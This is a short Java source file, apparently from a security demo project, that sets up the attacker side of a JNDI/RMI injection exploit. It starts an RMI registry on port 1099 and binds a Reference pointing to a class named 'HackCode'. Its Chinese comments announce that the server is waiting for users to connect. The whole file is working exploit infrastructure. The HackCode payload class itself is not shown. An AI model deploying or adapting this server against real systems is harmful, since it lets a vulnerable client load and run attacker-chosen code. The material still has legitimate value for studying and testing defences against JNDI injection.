package com.simpledev.tools.safe;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String ... args) throws Exception {
        try {
            //暴露本机1099端口作为RMI服务器端口
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            //将目标类绑定与RMI服务绑定
            Reference reference = new Reference(
                    "com.simpledev.tools.safe.HackCode"
                    ,"com.simpledev.tools.safe.HackCode"
                    ,null);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.rebind("HackCode",wrapper);
            System.err.println("RMI服务已开启，等待用户接入.......");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
